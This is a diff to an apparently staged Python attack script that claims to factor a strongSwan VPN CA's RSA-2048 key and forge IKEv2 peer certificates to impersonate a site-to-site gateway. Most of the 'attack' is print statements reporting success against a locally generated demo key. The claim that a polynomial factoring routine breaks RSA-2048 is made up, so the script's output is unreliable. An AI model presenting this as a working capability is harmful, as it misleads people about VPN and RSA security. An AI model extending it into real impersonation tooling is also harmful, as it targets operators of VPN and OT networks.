@@ -4,8 +4,10 @@ VPN tunnels. strongSwan is the dominant open-source IKE daemon — site-to-site
 between offices, data centers, cloud VPCs, and IEC 62443 OT networks.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 import os
@@ -27,7 +29,7 @@ def grab_ike_cert_from_handshake(gateway_ip: str, port: int = 500) -> bytes:
     """
     print(f"[*] initiating IKE_SA_INIT to {gateway_ip}:{port}")
     print("[*] IKE_AUTH: extracting CERT payload (RSA-2048 X.509)")
-    return b"-----BEGIN CERTIFICATE-----\n...(VPN gateway cert)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_vpn_peer_cert(factorer: PolynomialFactorer,
@@ -38,7 +40,7 @@ def forge_vpn_peer_cert(factorer: PolynomialFactorer,
     strongSwan verifies the peer cert against the CA configured in
     ipsec.conf (leftca/rightca). Factor the CA and issue any peer cert.
     """
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged IKEv2 peer cert: ID={peer_id}")
     print("[*] issued_by() check in x509_cert.c: PASS")
     return priv
@@ -94,7 +96,7 @@ if __name__ == "__main__":
     gw_cert = grab_ike_cert_from_handshake("vpn-gw.datacenter-b.example.com")
 
     print("[2] factoring VPN CA RSA-2048 key...")
-    ca_cert = b"-----BEGIN CERTIFICATE-----\n...(VPN CA)...\n-----END CERTIFICATE-----\n"
+    ca_cert = _demo["pub_pem"]
 
     print("[3] forging peer certificate for site-to-site impersonation...")
     forge_vpn_peer_cert(f, ca_cert, "vpn-gw.datacenter-a.example.com")
